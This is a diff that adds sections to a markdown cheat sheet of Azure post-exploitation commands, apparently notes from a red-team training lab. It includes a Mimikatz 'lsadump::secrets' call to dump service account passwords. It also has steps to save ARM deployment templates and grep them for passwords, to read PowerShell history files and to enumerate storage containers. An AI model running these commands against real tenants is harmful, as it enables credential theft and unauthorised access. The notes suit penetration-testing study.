@@ -9,6 +9,8 @@
   * [Powershell History](#Powershell-History)
 * [Reset password of other users](#Reset-password-of-other-users)
 * [Add credentials to enterprise applications](#Add-credentials-to-enterprise-applications)
+* [Deployments](#Deployments)
+* [Storage account](#Storage account)
 * [Arm Templates History](#Arm-Templates-History)
 * [Function apps continuous deployment](#Function-apps-continuous-deployment)
 
@@ -27,6 +29,11 @@ az ad signed-in-user list-owned-objects
 #### List all accessible resources
 ```
 Get-AzResource
+```
+
+#### Check if it can read any deployment
+```
+Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCEGROUP>
 ```
 
 #### Check role assignments on ResourceID
@@ -231,6 +238,11 @@ Connect-AzAccount -Credential $creds
 Invoke-Mimikayz -Dumpcreds
 ```
 
+#### Dump service account passwords
+```
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
+```
+
 ### Powershell History
 ```
 type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -262,6 +274,42 @@ Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
 ```
 Get-AzResource
 ```
+
+## Deployments
+#### Check access to any resource group
+```
+Get-AzResourceGroup
+```
+
+### Check if managed identity can read any deployment from the resource group:
+```
+Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCE GROUP NAME>
+```
+
+#### Save the deployment template
+```
+Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevencking_defcorphq.onmicrosoft.com.sapsrv
+```
+
+#### Find passwords in the template
+- Or manually scan through it!
+```
+cat <PATH TO .json FILE> | Select-String password
+```
+
+## Storage account
+#### Check accessible resources
+```
+Get-AzResource
+```
+
+#### Check if there is a container that is acccessible
+```
+Get-AzStorageContainer -Context (Get-AzStorageAccount -Name <NAME> -ResourceGroupName <RESOURCEGROUPNAME>).Context
+```
+
+#### Check using the "Storage Explorer" application! Might be possible then!
+
 
 ## Arm Templates History
 ```
